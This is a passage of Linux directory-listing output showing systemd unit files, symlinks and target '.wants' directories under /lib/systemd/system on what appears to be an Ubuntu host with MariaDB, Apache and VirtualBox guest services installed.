-rwxr-xr-x  1 root root  15K Jun 24  2019 systemd-update-utmp
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-user-sessions
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-veritysetup
-rwxr-xr-x  1 root root  10K Jun 24  2019 systemd-volatile-root
drwxr-xr-x  2 root root 4.0K Apr 20  2018 system-shutdown

/lib/systemd/system:
total 1.2M
-rw-r--r-- 1 root root  466 Dec  9  2019 open-vm-tools.service
-rw-r--r-- 1 root root  408 Dec  9  2019 vgauth.service
drwxr-xr-x 2 root root 4.0K Oct 20  2019 mariadb@bootstrap.service.d
drwxr-xr-x 2 root root 4.0K Oct 20  2019 apache2.service.d
-rw-r--r-- 1 root root  540 Oct 20  2019 vboxadd-service.service
-rw-r--r-- 1 root root  499 Oct 20  2019 vboxadd.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Oct 20  2019 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root   21 Oct 20  2019 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   15 Oct 20  2019 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Oct 20  2019 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Oct 20  2019 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 20  2019 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Oct 20  2019 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Oct 20  2019 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Oct 20  2019 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Oct 20  2019 saned.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 single.service -> /dev/null
lrwxrwxrwx 1 root root   22 Oct 20  2019 spice-vdagent.service -> spice-vdagentd.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 sudo.service -> /dev/null
lrwxrwxrwx 1 root root   27 Oct 20  2019 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Oct 20  2019 plymouth.service -> plymouth-quit.service
lrwxrwxrwx 1 root root   22 Oct 20  2019 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Oct 20  2019 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 fuse.service -> /dev/null
lrwxrwxrwx 1 root root   11 Oct 20  2019 gdm3.service -> gdm.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Oct 20  2019 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Oct 20  2019 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Oct 20  2019 network-manager.service -> NetworkManager.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Oct 20  2019 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Oct 20  2019 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Oct 20  2019 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Oct 20  2019 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   25 Oct 20  2019 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Oct 20  2019 default.target -> graphical.target
lrwxrwxrwx 1 root root   14 Oct 20  2019 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Oct 20  2019 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Oct 20  2019 alsa-utils.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Aug  6  2019 system-update.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 halt.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 basic.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 getty.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Aug  6  2019 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 timers.target.wants
drwxr-xr-x 2 root root 4.0K Aug  6  2019 user@.service.d
-rw-r--r-- 1 root root 4.5K Aug  2  2019 mariadb.service
-rw-r--r-- 1 root root 5.6K Aug  2  2019 mariadb@.service
-rw-r--r-- 1 root root  528 Jul 16  2019 apache-htcacheclean.service
-rw-r--r-- 1 root root  537 Jul 16  2019 apache-htcacheclean@.service
-rw-r--r-- 1 root root  346 Jul 16  2019 apache2.service
-rw-r--r-- 1 root root  418 Jul 16  2019 apache2@.service
-rw-r--r-- 1 root root  161 Jul  9  2019 motd-news.timer
-rw-r--r-- 1 root root  253 Jul  5  2019 whoopsie.service
-rw-r--r-- 1 root root 1.1K Jun 24  2019 console-getty.service
-rw-r--r-- 1 root root 1.3K Jun 24  2019 container-getty@.service
-rw-r--r-- 1 root root 1.1K Jun 24  2019 debug-shell.service
-rw-r--r-- 1 root root  797 Jun 24  2019 emergency.service
-rw-r--r-- 1 root root  342 Jun 24  2019 getty-static.service
-rw-r--r-- 1 root root 2.0K Jun 24  2019 getty@.service
-rw-r--r-- 1 root root  670 Jun 24  2019 initrd-cleanup.service
-rw-r--r-- 1 root root  830 Jun 24  2019 initrd-parse-etc.service
-rw-r--r-- 1 root root  589 Jun 24  2019 initrd-switch-root.service
-rw-r--r-- 1 root root  704 Jun 24  2019 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  717 Jun 24  2019 kmod-static-nodes.service
-rw-r--r-- 1 root root  362 Jun 24  2019 ondemand.service
-rw-r--r-- 1 root root  609 Jun 24  2019 quotaon.service
-rw-r--r-- 1 root root  716 Jun 24  2019 rc-local.service
-rw-r--r-- 1 root root  788 Jun 24  2019 rescue.service
-rw-r--r-- 1 root root 1.5K Jun 24  2019 serial-getty@.service
-rw-r--r-- 1 root root  554 Jun 24  2019 suspend-then-hibernate.target
-rw-r--r-- 1 root root 1.4K Jun 24  2019 system-update-cleanup.service
-rw-r--r-- 1 root root  724 Jun 24  2019 systemd-ask-password-console.service
-rw-r--r-- 1 root root  752 Jun 24  2019 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  752 Jun 24  2019 systemd-backlight@.service
-rw-r--r-- 1 root root  999 Jun 24  2019 systemd-binfmt.service
-rw-r--r-- 1 root root  537 Jun 24  2019 systemd-exit.service
-rw-r--r-- 1 root root  714 Jun 24  2019 systemd-fsck-root.service
-rw-r--r-- 1 root root  715 Jun 24  2019 systemd-fsck@.service
-rw-r--r-- 1 root root  551 Jun 24  2019 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Jun 24  2019 systemd-fsckd.socket
-rw-r--r-- 1 root root  584 Jun 24  2019 systemd-halt.service
-rw-r--r-- 1 root root  671 Jun 24  2019 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  541 Jun 24  2019 systemd-hibernate.service
-rw-r--r-- 1 root root 1.1K Jun 24  2019 systemd-hostnamed.service
-rw-r--r-- 1 root root  818 Jun 24  2019 systemd-hwdb-update.service
-rw-r--r-- 1 root root  559 Jun 24  2019 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  551 Jun 24  2019 systemd-initctl.service
-rw-r--r-- 1 root root  771 Jun 24  2019 systemd-journal-flush.service
-rw-r--r-- 1 root root  686 Jun 24  2019 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.6K Jun 24  2019 systemd-journald.service
-rw-r--r-- 1 root root  597 Jun 24  2019 systemd-kexec.service
-rw-r--r-- 1 root root 1.1K Jun 24  2019 systemd-localed.service
-rw-r--r-- 1 root root 1.5K Jun 24  2019 systemd-logind.service
-rw-r--r-- 1 root root  733 Jun 24  2019 systemd-machine-id-commit.service
-rw-r--r-- 1 root root 1007 Jun 24  2019 systemd-modules-load.service
-rw-r--r-- 1 root root  740 Jun 24  2019 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root 1.9K Jun 24  2019 systemd-networkd.service
-rw-r--r-- 1 root root  593 Jun 24  2019 systemd-poweroff.service
-rw-r--r-- 1 root root  655 Jun 24  2019 systemd-quotacheck.service
-rw-r--r-- 1 root root  792 Jun 24  2019 systemd-random-seed.service
-rw-r--r-- 1 root root  588 Jun 24  2019 systemd-reboot.service
-rw-r--r-- 1 root root  833 Jun 24  2019 systemd-remount-fs.service
-rw-r--r-- 1 root root 1.7K Jun 24  2019 systemd-resolved.service
-rw-r--r-- 1 root root  724 Jun 24  2019 systemd-rfkill.service
-rw-r--r-- 1 root root  573 Jun 24  2019 systemd-suspend-then-hibernate.service
-rw-r--r-- 1 root root  537 Jun 24  2019 systemd-suspend.service
-rw-r--r-- 1 root root  693 Jun 24  2019 systemd-sysctl.service
-rw-r--r-- 1 root root 1.1K Jun 24  2019 systemd-timedated.service
-rw-r--r-- 1 root root 1.4K Jun 24  2019 systemd-timesyncd.service
-rw-r--r-- 1 root root  659 Jun 24  2019 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  764 Jun 24  2019 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  744 Jun 24  2019 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  863 Jun 24  2019 systemd-udev-settle.service
-rw-r--r-- 1 root root  755 Jun 24  2019 systemd-udev-trigger.service
-rw-r--r-- 1 root root  985 Jun 24  2019 systemd-udevd.service
-rw-r--r-- 1 root root  797 Jun 24  2019 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  794 Jun 24  2019 systemd-update-utmp.service
-rw-r--r-- 1 root root  628 Jun 24  2019 systemd-user-sessions.service
-rw-r--r-- 1 root root  690 Jun 24  2019 systemd-volatile-root.service
-rw-r--r-- 1 root root  593 Jun 24  2019 user@.service
-rw-r--r-- 1 root root  505 Jun 10  2019 dbus.service
-rw-r--r-- 1 root root  106 Jun 10  2019 dbus.socket
-rw-r--r-- 1 root root  340 Jun  5  2019 snapd.autoimport.service
-rw-r--r-- 1 root root  320 Jun  5  2019 snapd.core-fixup.service
-rw-r--r-- 1 root root  172 Jun  5  2019 snapd.failure.service
-rw-r--r-- 1 root root  322 Jun  5  2019 snapd.seeded.service
-rw-r--r-- 1 root root  477 Jun  5  2019 snapd.service
-rw-r--r-- 1 root root  372 Jun  5  2019 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Jun  5  2019 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Jun  5  2019 snapd.socket
-rw-r--r-- 1 root root  521 Jun  5  2019 snapd.system-shutdown.service
-rw-r--r-- 1 root root  142 May 30  2019 cups.path
-rw-r--r-- 1 root root  209 May 30  2019 cups.service
-rw-r--r-- 1 root root  132 May 30  2019 cups.socket
-rw-r--r-- 1 root root  289 May  9  2019 netplan-wpa@.service
-rw-r--r-- 1 root root  238 May  7  2019 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 May  7  2019 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  326 May  7  2019 apt-daily.service
-rw-r--r-- 1 root root  156 May  7  2019 apt-daily.timer
-rw-r--r-- 1 root root  433 May  6  2019 ModemManager.service
-rw-r--r-- 1 root root  478 May  1  2019 wpa_supplicant-wired@.service
-rw-r--r-- 1 root root  307 May  1  2019 wpa_supplicant.service
-rw-r--r-- 1 root root  455 May  1  2019 wpa_supplicant@.service
-rw-r--r-- 1 root root  372 Apr 29  2019 unattended-upgrades.service
-rw-r--r-- 1 root root  312 Apr 23  2019 console-setup.service
-rw-r--r-- 1 root root  287 Apr 23  2019 keyboard-setup.service
-rw-r--r-- 1 root root  330 Apr 23  2019 setvtrgb.service
-rw-r--r-- 1 root root  250 Apr 10  2019 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Apr 10  2019 ureadahead-stop.timer
-rw-r--r-- 1 root root  404 Apr 10  2019 ureadahead.service
-rw-r--r-- 1 root root  412 Apr  4  2019 plymouth-halt.service
-rw-r--r-- 1 root root  426 Apr  4  2019 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Apr  4  2019 plymouth-poweroff.service
-rw-r--r-- 1 root root  200 Apr  4  2019 plymouth-quit-wait.service
-rw-r--r-- 1 root root  194 Apr  4  2019 plymouth-quit.service
-rw-r--r-- 1 root root  244 Apr  4  2019 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Apr  4  2019 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Apr  4  2019 plymouth-start.service
-rw-r--r-- 1 root root  291 Apr  4  2019 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Apr  4  2019 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Apr  4  2019 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  293 Mar 12  2019 gpu-manager.service
-rw-r--r-- 1 root root  382 Mar  4  2019 packagekit-offline-update.service
-rw-r--r-- 1 root root  371 Mar  4  2019 packagekit.service
-rw-r--r-- 1 root root 1007 Feb 19  2019 gdm.service
-rw-r--r-- 1 root root  242 Feb  7  2019 apport-autoreport.service
-rw-r--r-- 1 root root  118 Feb  6  2019 fwupdate-cleanup.service
-rw-r--r-- 1 root root 1.1K Jan 30  2019 avahi-daemon.service
-rw-r--r-- 1 root root  870 Jan 30  2019 avahi-daemon.socket
-rw-r--r-- 1 root root  218 Jan 25  2019 upower.service
-rw-r--r-- 1 root root  254 Jan 15  2019 thermald.service
-rw-r--r-- 1 root root  368 Jan  9  2019 irqbalance.service
-rw-r--r-- 1 root root  155 Dec 17  2018 phpsessionclean.service
-rw-r--r-- 1 root root  144 Dec 17  2018 phpsessionclean.timer
-rw-r--r-- 1 root root  167 Nov 27  2018 wacom-inputattach@.service
-rw-r--r-- 1 root root  183 Nov 22  2018 usbmuxd.service
-rw-r--r-- 1 root root  364 Nov  3  2018 NetworkManager-dispatcher.service
-rw-r--r-- 1 root root  302 Nov  3  2018 NetworkManager-wait-online.service
-rw-r--r-- 1 root root  960 Nov  3  2018 NetworkManager.service
-rw-r--r-- 1 root root  620 Oct 31  2018 bolt.service
-rw-r--r-- 1 root root  211 Oct 23  2018 fwupd-offline-update.service
-rw-r--r-- 1 root root  473 Oct 23  2018 fwupd.service
-rw-r--r-- 1 root root   92 Oct 16  2018 fstrim.service
-rw-r--r-- 1 root root  170 Oct 16  2018 fstrim.timer
-rw-r--r-- 1 root root  189 Oct 16  2018 uuidd.service
-rw-r--r-- 1 root root  126 Oct 16  2018 uuidd.socket
-rw-r--r-- 1 root root  618 Oct 15  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct 15  2018 friendly-recovery.target
-rw-r--r-- 1 root root  258 Oct 15  2018 networkd-dispatcher.service
-rw-r--r-- 1 root root  169 Sep 26  2018 clean-mount-point@.service
-rw-r--r-- 1 root root  203 Sep 26  2018 udisks2.service
-rw-r--r-- 1 root root  173 Aug  7  2018 motd-news.service
-rw-r--r-- 1 root root  212 Jul 10  2018 apport-autoreport.path
-rw-r--r-- 1 root root  420 Jun 22  2018 bluetooth.service
-rw-r--r-- 1 root root  290 Apr 24  2018 rsyslog.service
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 20  2018 runlevel5.target.wants
-rw-r--r-- 1 root root  181 Apr  3  2018 configure-printer@.service
-rw-r--r-- 1 root root  175 Mar 27  2018 polkit.service
-rw-r--r-- 1 root root  544 Mar 23  2018 apparmor.service
-rw-r--r-- 1 root root  222 Mar  6  2018 usb_modeswitch@.service
-rw-r--r-- 1 root root  207 Feb 26  2018 pppd-dns.service
-rw-r--r-- 1 root root 1.1K Feb 16  2018 rtkit-daemon.service
-rw-r--r-- 1 root root  234 Feb  8  2018 cups-browsed.service
-rw-r--r-- 1 root root  419 Feb  1  2018 iio-sensor-proxy.service
-rw-r--r-- 1 root root  919 Jan 28  2018 basic.target
-rw-r--r-- 1 root root  419 Jan 28  2018 bluetooth.target
-rw-r--r-- 1 root root  465 Jan 28  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  412 Jan 28  2018 cryptsetup.target
-rw-r--r-- 1 root root  750 Jan 28  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  665 Jan 28  2018 dev-mqueue.mount
-rw-r--r-- 1 root root  471 Jan 28  2018 emergency.target
-rw-r--r-- 1 root root  541 Jan 28  2018 exit.target
-rw-r--r-- 1 root root  480 Jan 28  2018 final.target
-rw-r--r-- 1 root root  506 Jan 28  2018 getty-pre.target
-rw-r--r-- 1 root root  500 Jan 28  2018 getty.target
-rw-r--r-- 1 root root  598 Jan 28  2018 graphical.target
-rw-r--r-- 1 root root  527 Jan 28  2018 halt.target
-rw-r--r-- 1 root root  509 Jan 28  2018 hibernate.target
-rw-r--r-- 1 root root  530 Jan 28  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  593 Jan 28  2018 initrd-fs.target
-rw-r--r-- 1 root root  561 Jan 28  2018 initrd-root-device.target
-rw-r--r-- 1 root root  566 Jan 28  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  754 Jan 28  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  763 Jan 28  2018 initrd.target
-rw-r--r-- 1 root root  541 Jan 28  2018 kexec.target
-rw-r--r-- 1 root root  435 Jan 28  2018 local-fs-pre.target
-rw-r--r-- 1 root root  547 Jan 28  2018 local-fs.target
-rw-r--r-- 1 root root  445 Jan 28  2018 machine.slice
-rw-r--r-- 1 root root  532 Jan 28  2018 multi-user.target
-rw-r--r-- 1 root root  505 Jan 28  2018 network-online.target
-rw-r--r-- 1 root root  502 Jan 28  2018 network-pre.target
-rw-r--r-- 1 root root  521 Jan 28  2018 network.target
-rw-r--r-- 1 root root  554 Jan 28  2018 nss-lookup.target
-rw-r--r-- 1 root root  513 Jan 28  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  394 Jan 28  2018 paths.target
-rw-r--r-- 1 root root  592 Jan 28  2018 poweroff.target
-rw-r--r-- 1 root root  417 Jan 28  2018 printer.target
-rw-r--r-- 1 root root  745 Jan 28  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  655 Jan 28  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  583 Jan 28  2018 reboot.target
-rw-r--r-- 1 root root  549 Jan 28  2018 remote-cryptsetup.target
-rw-r--r-- 1 root root  436 Jan 28  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  522 Jan 28  2018 remote-fs.target
-rw-r--r-- 1 root root  492 Jan 28  2018 rescue.target
-rw-r--r-- 1 root root  540 Jan 28  2018 rpcbind.target
-rw-r--r-- 1 root root  442 Jan 28  2018 shutdown.target
-rw-r--r-- 1 root root  402 Jan 28  2018 sigpwr.target
-rw-r--r-- 1 root root  460 Jan 28  2018 sleep.target
-rw-r--r-- 1 root root  449 Jan 28  2018 slices.target
-rw-r--r-- 1 root root  420 Jan 28  2018 smartcard.target
-rw-r--r-- 1 root root  396 Jan 28  2018 sockets.target
-rw-r--r-- 1 root root  420 Jan 28  2018 sound.target
-rw-r--r-- 1 root root  503 Jan 28  2018 suspend.target
-rw-r--r-- 1 root root  393 Jan 28  2018 swap.target
-rw-r--r-- 1 root root  795 Jan 28  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  767 Jan 28  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  710 Jan 28  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root  558 Jan 28  2018 sysinit.target
-rw-r--r-- 1 root root 1.4K Jan 28  2018 syslog.socket
-rw-r--r-- 1 root root  592 Jan 28  2018 system-update.target
-rw-r--r-- 1 root root  445 Jan 28  2018 system.slice
-rw-r--r-- 1 root root  704 Jan 28  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  632 Jan 28  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  564 Jan 28  2018 systemd-initctl.socket
-rw-r--r-- 1 root root 1.2K Jan 28  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  882 Jan 28  2018 systemd-journald.socket
-rw-r--r-- 1 root root  631 Jan 28  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  657 Jan 28  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  490 Jan 28  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  635 Jan 28  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  610 Jan 28  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  435 Jan 28  2018 time-sync.target
-rw-r--r-- 1 root root  445 Jan 28  2018 timers.target
-rw-r--r-- 1 root root  457 Jan 28  2018 umount.target
-rw-r--r-- 1 root root  432 Jan 28  2018 user.slice
-rw-r--r-- 1 root root  493 Jan 26  2018 ssh.service
-rw-r--r-- 1 root root  244 Jan 26  2018 ssh@.service
-rw-r--r-- 1 root root  216 Jan 16  2018 ssh.socket
-rw-r--r-- 1 root root  741 Dec 18  2017 accounts-daemon.service
-rw-r--r-- 1 root root  411 Dec 15  2017 spice-vdagentd.service
-rw-r--r-- 1 root root   49 Dec 15  2017 spice-vdagentd.target
-rw-r--r-- 1 root root  483 Dec  4  2017 brltty.service
-rw-r--r-- 1 root root  246 Nov 20  2017 apport-forward.socket
-rw-r--r-- 1 root root  142 Nov 20  2017 apport-forward@.service
-rw-r--r-- 1 root root  251 Nov 16  2017 cron.service
-rw-r--r-- 1 root root  266 Aug 15  2017 ufw.service
-rw-r--r-- 1 root root  298 Jul 23  2017 colord.service
-rw-r--r-- 1 root root  154 Jul 20  2017 geoclue.service
-rw-r--r-- 1 root root  133 Jul 15  2017 saned.socket
-rw-r--r-- 1 root root  224 May 29  2017 anacron.service
-rw-r--r-- 1 root root  145 May 29  2017 anacron.timer
-rw-r--r-- 1 root root  376 May 19  2017 kerneloops.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.path
-rw-r--r-- 1 root root  234 Apr 22  2017 acpid.service
-rw-r--r-- 1 root root  115 Apr 22  2017 acpid.socket
-rw-r--r-- 1 root root  429 Mar 16  2017 brltty-udev.service
-rw-r--r-- 1 root root  539 Feb 16  2017 alsa-restore.service
-rw-r--r-- 1 root root  512 Feb 16  2017 alsa-state.service
-rw-r--r-- 1 root root  626 Nov 28  2016 ifup@.service
-rw-r--r-- 1 root root  735 Nov 25  2016 networking.service
-rw-r--r-- 1 root root  431 Jun  6  2016 dns-clean.service
-rw-r--r-- 1 root root  309 Apr 25  2015 saned@.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/mariadb@bootstrap.service.d:
total 4.0K
-rw-r--r-- 1 root root 533 Jul 26  2019 use_galera_new_cluster.conf

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Jul 16  2019 apache2-systemd.conf

/lib/systemd/system/system-update.target.wants:
total 0
lrwxrwxrwx 1 root root 31 Oct 20  2019 fwupd-offline-update.service -> ../fwupd-offline-update.service
lrwxrwxrwx 1 root root 36 Oct 20  2019 packagekit-offline-update.service -> ../packagekit-offline-update.service

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 Oct 20  2019 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Oct 20  2019 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 Oct 20  2019 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 Oct 20  2019 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Oct 20  2019 dbus.service -> ../dbus.service
lrwxrwxrwx 1 root root 15 Oct 20  2019 getty.target -> ../getty.target
lrwxrwxrwx 1 root root 29 Oct 20  2019 plymouth-quit-wait.service -> ../plymouth-quit-wait.service
lrwxrwxrwx 1 root root 24 Oct 20  2019 plymouth-quit.service -> ../plymouth-quit.service
lrwxrwxrwx 1 root root 33 Oct 20  2019 systemd-ask-password-wall.path -> ../systemd-ask-password-wall.path
lrwxrwxrwx 1 root root 25 Oct 20  2019 systemd-logind.service -> ../systemd-logind.service
lrwxrwxrwx 1 root root 39 Oct 20  2019 systemd-update-utmp-runlevel.service -> ../systemd-update-utmp-runlevel.service
lrwxrwxrwx 1 root root 32 Oct 20  2019 systemd-user-sessions.service -> ../systemd-user-sessions.service

/lib/systemd/system/poweroff.target.wants:
total 0
lrwxrwxrwx 1 root root 28 Oct 20  2019 plymouth-poweroff.service -> ../plymouth-poweroff.service

/lib/systemd/system/reboot.target.wants:
total 0
lrwxrwxrwx 1 root root 26 Oct 20  2019 plymouth-reboot.service -> ../plymouth-reboot.service

/lib/systemd/system/sysinit.target.wants:
total 0
lrwxrwxrwx 1 root root 20 Oct 20  2019 cryptsetup.target -> ../cryptsetup.target
lrwxrwxrwx 1 root root 22 Oct 20  2019 dev-hugepages.mount -> ../dev-hugepages.mount
lrwxrwxrwx 1 root root 19 Oct 20  2019 dev-mqueue.mount -> ../dev-mqueue.mount
lrwxrwxrwx 1 root root 28 Oct 20  2019 kmod-static-nodes.service -> ../kmod-static-nodes.service
lrwxrwxrwx 1 root root 30 Oct 20  2019 plymouth-read-write.service -> ../plymouth-read-write.service
lrwxrwxrwx 1 root root 25 Oct 20  2019 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 36 Oct 20  2019 proc-sys-fs-binfmt_misc.automount -> ../proc-sys-fs-binfmt_misc.automount
lrwxrwxrwx 1 root root 32 Oct 20  2019 sys-fs-fuse-connections.mount -> ../sys-fs-fuse-connections.mount
lrwxrwxrwx 1 root root 26 Oct 20  2019 sys-kernel-config.mount -> ../sys-kernel-config.mount
lrwxrwxrwx 1 root root 25 Oct 20  2019 sys-kernel-debug.mount -> ../sys-kernel-debug.mount
lrwxrwxrwx 1 root root 36 Oct 20  2019 systemd-ask-password-console.path -> ../systemd-ask-password-console.path
lrwxrwxrwx 1 root root 25 Oct 20  2019 systemd-binfmt.service -> ../systemd-binfmt.service
lrwxrwxrwx 1 root root 30 Oct 20  2019 systemd-hwdb-update.service -> ../systemd-hwdb-update.service
lrwxrwxrwx 1 root root 32 Oct 20  2019 systemd-journal-flush.service -> ../systemd-journal-flush.service
lrwxrwxrwx 1 root root 27 Oct 20  2019 systemd-journald.service -> ../systemd-journald.service
